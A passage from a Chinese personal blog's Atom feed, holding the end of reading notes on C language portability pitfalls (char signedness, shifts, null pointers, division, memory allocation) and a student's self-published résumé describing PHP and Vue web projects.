<h3 id="标识符名称的限制"><a href="#标识符名称的限制" class="headerlink" title="标识符名称的限制"></a>标识符名称的限制</h3><p>某些C语言实现会把标识符中出现的所有字符作为有效字符，而有些C实现则会自动截断长标识符名称的尾部。连接器也会对他们能够处理的名称强加限制，例如外部名称中只允许使用大写字母。</p>
<p>需要注意：</p>
<ul>
<li>区分大小写？</li>
<li>能区别的字符长度？</li>
</ul>
<h3 id="整数的大小"><a href="#整数的大小" class="headerlink" title="整数的大小"></a>整数的大小</h3><p>主要的要点：</p>
<ul>
<li>C语言对各种不同类型的整数（short，int，long）的相对长度做了一些规定：（1）三种类型整型长度非递减（2）一个普通的（int）足够大容纳任何数组下标（3）字符长度由硬件特性决定。</li>
<li>可移植性最好的是long。因为其能表示的范围是最大的，但是也会带来空间的消耗。</li>
</ul>
<h3 id="字符是有符号整数还是无符号整数"><a href="#字符是有符号整数还是无符号整数" class="headerlink" title="字符是有符号整数还是无符号整数"></a>字符是有符号整数还是无符号整数</h3><p>现代大多数计算机都支持8位字符，并非所有的编译器都按照同样的方式来解释这8位数，可能会将其识别为有符号数或无符号数。有符号范围为-128-127，无符号为0-255.可将这个字符声明为无符号字符（unsigned char）.另外，如果c是一个字符，使用（unsigned） c可能会失败，因为c将首先被转为int型整数。正确的方式是使用（unsigned char）c，这种方法不会转换为int整数。</p>
<h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><ul>
<li>右移要区分是算术右移还是逻辑右移</li>
<li>如果被移位对象是n位，那么移位计数&gt;=0,严格小于n</li>
<li>移位可以用来处理除数运算，且速度会比正常的除法操作快</li>
</ul>
<h3 id="内存位置0"><a href="#内存位置0" class="headerlink" title="内存位置0"></a>内存位置0</h3><ul>
<li>null指针不指向任何对象，因此，除非是赋值或者比较运算，其他任何目的使用null指针都是非法的。某些编译器对内存位置0强加了硬件级的读保护；其他只允许读，不允许写。在所有C程序中，勿用null指针的效果都是未定义的。</li>
<li>不同的编译器对null的规定也不同。可以通过把程序移到不允许读内存位置0的机器上运行来检查这个问题。</li>
</ul>
<h3 id="除法运算时发生的截断"><a href="#除法运算时发生的截断" class="headerlink" title="除法运算时发生的截断"></a>除法运算时发生的截断</h3><p>对于：<br><code>q= a/b</code>;<br><code>r= a%b</code>;<br>我们希望a、b、q、r之间维持怎样的关系呢？</p>
<ol>
<li>最重要的一点，我们希望q*b+r==a，因为这是定义余数的关系。</li>
<li>如果我们改变a的正负，我们希望这会改变q的符号，这不会改变q的绝对值。</li>
<li>当b&gt;0时，我们希望保证r&gt;=0且r&lt;b。例如，如果余数用于哈希表的索引，确保它是一个有效的索引值很重要。</li>
</ol>
<p>但是上述三条无法同时满足。<br>在取余的时候尽量避免被余数为负，并且声明为无符号数。</p>
<h3 id="首先释放，然后重新分配"><a href="#首先释放，然后重新分配" class="headerlink" title="首先释放，然后重新分配"></a>首先释放，然后重新分配</h3><p>大多数c语言实现都为使用者提供了3个内存分配函数：malloc，realloc和free。</p>
<ul>
<li>调用malloc(n)将返回一个指针，指向一块新分配的可容纳n个字符的内存，编程者可以使用这块内存。</li>
<li>把malloc(n)返回的指针作为参数传入给free函数，就释放了这块内存，这样就可以重新利用了。</li>
<li>调用realloc函数时，需要把指针向一块已分配内存的区域指针以及这块内存新的大小作为参数传入，就可以调整这块内存区域为新的大小，这个过程可能涉及到内存的拷贝。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-导读&quot;&gt;&lt;a href=&quot;#0-导读&quot; class=&quot;headerlink&quot; title=&quot;0|导读&quot;&gt;&lt;/a&gt;0|导读&lt;/h2&gt;&lt;p&gt;程序设计错误实际上反映的是程序与程序员对该程序的“心智模式”两者的相异之处。&lt;/p&gt;
&lt;h2 id=&quot;1-词法陷阱&quot;&gt;&lt;a 
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>吴多智|个人简历</title>
    <link href="http://yoursite.com/2018/04/23/%E5%90%B4%E5%A4%9A%E6%99%BA-%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86/"/>
    <id>http://yoursite.com/2018/04/23/吴多智-个人简历/</id>
    <published>2018-04-23T11:02:22.000Z</published>
    <updated>2018-05-06T11:30:14.794Z</updated>
    
    <content type="html"><![CDATA[<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><ul>
<li>吴多智</li>
<li>Tel: 130-9892-1645</li>
<li>Email: wduozhi@gmail.com</li>
<li>Github: <a href="https://github.com/wuduozhi" target="_blank" rel="external">https://github.com/wuduozhi</a></li>
<li>Blog: wuduozhi.me</li>
</ul>
<hr>
<h3 id="自我评价"><a href="#自我评价" class="headerlink" title="自我评价"></a>自我评价</h3><ul>
<li>一年的线上项目开发维护经历，熟悉项目开发流程</li>
<li>对Linux有基本的了解，能搭建服务器环境，有搭建个人网站的经历</li>
<li>熟悉git版本控制工具</li>
<li>学习能力强，大一自学Web开发</li>
</ul>
<hr>
<h3 id="项目经历"><a href="#项目经历" class="headerlink" title="项目经历"></a>项目经历</h3><h4 id="内容分发平台-http-1000-hnu-edu-cn"><a href="#内容分发平台-http-1000-hnu-edu-cn" class="headerlink" title="内容分发平台  http://1000.hnu.edu.cn"></a>内容分发平台  <a href="http://1000.hnu.edu.cn" target="_blank" rel="external">http://1000.hnu.edu.cn</a></h4><ul>
<li>学校通知、活动等内容分发平台，类似学校的门户网站。项目采用mvc架构，前后端完全分离，后端使用PHP的CI框架，前端使用Vue，用RESTFul API接口进行数据交互</li>
<li>自己负责后台逻辑的开发，熟练掌握了CI框架的使用，掌握对Mysql数据库的使用，理解RESTFul API接口的设计规范，加深了对MVC架构的理解</li>
</ul>
<h4 id="微信公众号后台开发"><a href="#微信公众号后台开发" class="headerlink" title="微信公众号后台开发"></a>微信公众号后台开发</h4><ul>
<li>学校网络工作室的微信公众号，负责原创内容的分发和集成一些功能，如成绩查询、课表查询…后台使用PHP的微框架Slim+Medoo，Slim负责处理请求的相应，Medoo负责数据库的处理，前端使用jQuery，用RESTFul API接口进行数据交互</li>
<li>自己负责后台功能的业务逻辑的开发与接入微信的验证，过程中熟悉了微信公众号api。这一经历，自己懂得了怎么去学习与调用别人的api,比如百度、腾讯…的人工智能平台</li>
</ul>
<hr>
<h3 id="技能水平"><a href="#技能水平" class="headerlink" title="技能水平"></a>技能水平</h3><ul>
<li>后端技术<ul>
<li>掌握php后台开发，熟悉常见的MVC框架，CI、TP</li>
<li>熟悉Java后台开发，了解spring，Hibernate</li>
</ul>
</li>
<li>前端技术<ul>
<li>了解前端三剑客基本语法，能看懂前端代码，与前端沟通无障碍</li>
</ul>
</li>
<li>服务器<ul>
<li>了解Linux系统的基本使用，能搭建服务器环境</li>
</ul>
</li>
</ul>
<hr>
<h3 id="教育背景"><a href="#教育背景" class="headerlink" title="教育背景"></a>教育背景</h3><p>2016.9-至今 湖南大学 软件工程（本科）</p>
<p>主修课程：数据结构、操作系统、深入理解计算机系统</p>
<p>校内荣誉：2017单项奖学金</p>
<p>感谢您花时间阅读我的简历，期待能有机会和您共事。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;个人信息&quot;&gt;&lt;a href=&quot;#个人信息&quot; class=&quot;headerlink&quot; title=&quot;个人信息&quot;&gt;&lt;/a&gt;个人信息&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;吴多智&lt;/li&gt;
&lt;li&gt;Tel: 130-9892-1645&lt;/li&gt;
&lt;li&gt;Email: wduozhi@
    
    </summary>
    
      <category term="college" scheme="http://yoursite.com/categories/college/"/>
    
    
      <category term="college" scheme="http://yoursite.com/tags/college/"/>
    
  </entry>
  
</feed>
